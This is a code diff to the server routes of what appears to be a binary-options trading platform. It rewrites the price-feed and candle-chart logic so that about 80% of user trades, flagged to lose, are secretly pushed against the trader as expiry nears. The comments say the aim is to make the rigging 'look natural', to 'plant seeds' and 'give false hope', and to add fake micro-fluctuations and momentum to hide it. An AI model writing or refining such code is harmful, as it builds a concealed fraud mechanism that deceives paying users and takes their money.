@@ -411,86 +411,114 @@ export async function registerRoutes(app: Express): Promise<Server> {
               return;
             }
             
-            // Last 20 seconds: manipulate price based on shouldWin
-            if (timeRemaining <= 20000) {
+            // Smart manipulation - looks natural
+            if (timeRemaining <= 30000) {
               hasActiveTradeInLast20Seconds = true;
               
-              // Calculate manipulation strength - stronger in last 5 seconds
-              const manipulationStrength = timeRemaining <= 5000 ? 35 : 20;
+              // Calculate time-based multiplier (gradual increase, not sudden)
+              const timeProgress = (30000 - timeRemaining) / 30000; // 0 to 1
+              const manipulationStrength = 2 + (timeProgress * 4); // 2x to 6x gradually
               
               if (!trade.shouldWin) {
-                // 80% of trades: aggressive reversal against user
+                // 80% of trades: subtle but effective manipulation
                 if (trade.type === 'CALL') {
-                  // User wants price up, push it DOWN
+                  // User wants price up, gradually push it DOWN
                   const currentlyWinning = currentPrice > trade.openPrice;
+                  const priceDistance = Math.abs(currentPrice - trade.openPrice) / trade.openPrice;
+                  
                   if (currentlyWinning) {
-                    // Very aggressive downward push to ensure loss
-                    priceManipulation -= baseVolatility * manipulationStrength;
+                    // Winning: create natural-looking pullback
+                    if (timeRemaining <= 10000) {
+                      // Last 10 seconds: increase pressure naturally
+                      priceManipulation -= baseVolatility * manipulationStrength * (1 + priceDistance * 10);
+                    } else {
+                      // Before last 10 seconds: gentle pullback
+                      priceManipulation -= baseVolatility * 2;
+                    }
                   } else {
-                    // Keep pushing down
-                    priceManipulation -= baseVolatility * 10;
+                    // Losing: prevent recovery with gentle pressure
+                    priceManipulation -= baseVolatility * 1.5;
                   }
                 } else {
-                  // User wants price down, push it UP
+                  // User wants price down, gradually push it UP
                   const currentlyWinning = currentPrice < trade.openPrice;
+                  const priceDistance = Math.abs(currentPrice - trade.openPrice) / trade.openPrice;
+                  
                   if (currentlyWinning) {
-                    // Very aggressive upward push to ensure loss
-                    priceManipulation += baseVolatility * manipulationStrength;
+                    // Winning: create natural-looking bounce
+                    if (timeRemaining <= 10000) {
+                      // Last 10 seconds: increase pressure naturally
+                      priceManipulation += baseVolatility * manipulationStrength * (1 + priceDistance * 10);
+                    } else {
+                      // Before last 10 seconds: gentle bounce
+                      priceManipulation += baseVolatility * 2;
+                    }
                   } else {
-                    // Keep pushing up
-                    priceManipulation += baseVolatility * 10;
+                    // Losing: prevent recovery with gentle pressure
+                    priceManipulation += baseVolatility * 1.5;
                   }
                 }
               } else {
-                // 20% of trades: help user win
+                // 20% of trades: help user win naturally
                 if (trade.type === 'CALL') {
-                  // User wants price up, push it UP
                   const currentlyWinning = currentPrice > trade.openPrice;
                   if (!currentlyWinning) {
-                    priceManipulation += baseVolatility * 20; // Strong upward push to help win
+                    priceManipulation += baseVolatility * manipulationStrength; // Gradual push up
                   } else {
-                    priceManipulation += baseVolatility * 5; // Keep it winning
+                    priceManipulation += baseVolatility * 0.5; // Maintain
                   }
                 } else {
-                  // User wants price down, push it DOWN
                   const currentlyWinning = currentPrice < trade.openPrice;
                   if (!currentlyWinning) {
-                    priceManipulation -= baseVolatility * 20; // Strong downward push to help win
+                    priceManipulation -= baseVolatility * manipulationStrength; // Gradual push down
                   } else {
-                    priceManipulation -= baseVolatility * 5; // Keep it winning
+                    priceManipulation -= baseVolatility * 0.5; // Maintain
                   }
                 }
               }
             }
-            // Before last 20 seconds: subtle manipulation to prepare for reversal
-            else if (!trade.shouldWin) {
+            // Early stage: let trade develop naturally
+            else if (!trade.shouldWin && timeRemaining <= 45000) {
+              // 15 seconds before manipulation starts: plant seeds
               if (trade.type === 'CALL') {
-                // Let price go up first, then reverse dramatically in last seconds
                 const currentlyWinning = currentPrice > trade.openPrice;
                 if (currentlyWinning) {
-                  priceManipulation -= baseVolatility * 3; // Start pulling down
+                  // Already winning: very subtle downward bias
+                  priceManipulation -= baseVolatility * 0.5;
                 } else {
-                  priceManipulation += baseVolatility * 1; // Let it seem like it's going in their favor
+                  // Let it go up to give false hope
+                  priceManipulation += baseVolatility * 0.3;
                 }
               } else {
-                // Let price go down first, then reverse dramatically in last seconds
                 const currentlyWinning = currentPrice < trade.openPrice;
                 if (currentlyWinning) {
-                  priceManipulation += baseVolatility * 3; // Start pulling up
+                  // Already winning: very subtle upward bias
+                  priceManipulation += baseVolatility * 0.5;
                 } else {
-                  priceManipulation -= baseVolatility * 1; // Let it seem like it's going in their favor
+                  // Let it go down to give false hope
+                  priceManipulation -= baseVolatility * 0.3;
                 }
               }
             }
           }
         });
         
-        // Random volatility (smooth movement)
+        // Natural market volatility with micro-movements
         let randomChange = (Math.random() - 0.5) * 2 * baseVolatility;
         
-        // Occasional sudden reversal (5% chance)
-        if (Math.random() < 0.05 && !hasActiveTradeInLast20Seconds) {
-          randomChange *= 8; // Sudden spike
+        // Add natural micro-fluctuations (makes price look alive)
+        const microFluctuation = (Math.random() - 0.5) * baseVolatility * 0.3;
+        randomChange += microFluctuation;
+        
+        // Occasional natural spike (3% chance, only when no active manipulation)
+        if (Math.random() < 0.03 && !hasActiveTradeInLast20Seconds) {
+          randomChange *= 3; // Natural market spike (reduced from 8)
+        }
+        
+        // Add trend momentum (price tends to continue in same direction briefly)
+        const priceTrend = (currentPrice - parseFloat(asset.currentPrice)) / parseFloat(asset.currentPrice);
+        if (Math.abs(priceTrend) > 0.0001 && !hasActiveTradeInLast20Seconds) {
+          randomChange += priceTrend * baseVolatility * 0.5; // Momentum effect
         }
         
         // Combine all factors
@@ -577,23 +605,33 @@ export async function registerRoutes(app: Express): Promise<Server> {
       volatility = 0.002; // Indices
     }
     
-    // Check for active trades on this pair to manipulate candles
+    // Check for active trades on this pair to manipulate candles naturally
     let candleManipulation = 0;
     activeTrades.forEach(trade => {
       const tradePair = trade.assetId.replace('_OTC', '');
       if (tradePair === pair) {
         const timeRemaining = trade.expiryTime - currentTime;
         
-        // Last 10 seconds: manipulate candles aggressively
-        if (timeRemaining <= 10000 && timeRemaining > 0) {
+        // Gradual and natural-looking candle manipulation
+        if (timeRemaining <= 25000 && timeRemaining > 0) {
+          const timeProgress = (25000 - timeRemaining) / 25000; // 0 to 1
+          const candleStrength = 1 + (timeProgress * 2); // 1x to 3x gradually
+          
           if (!trade.shouldWin) {
-            // 80% of trades: create candles that work against user
+            // 80% of trades: subtle candle manipulation
             if (trade.type === 'CALL') {
-              // User wants price up, create bearish candles
-              candleManipulation -= volatility * 8;
+              // User wants price up, create natural bearish pressure
+              candleManipulation -= volatility * candleStrength;
             } else {
-              // User wants price down, create bullish candles
-              candleManipulation += volatility * 8;
+              // User wants price down, create natural bullish pressure
+              candleManipulation += volatility * candleStrength;
+            }
+          } else {
+            // 20% of trades: help with natural-looking candles
+            if (trade.type === 'CALL') {
+              candleManipulation += volatility * candleStrength * 0.5;
+            } else {
+              candleManipulation -= volatility * candleStrength * 0.5;
             }
           }
         }
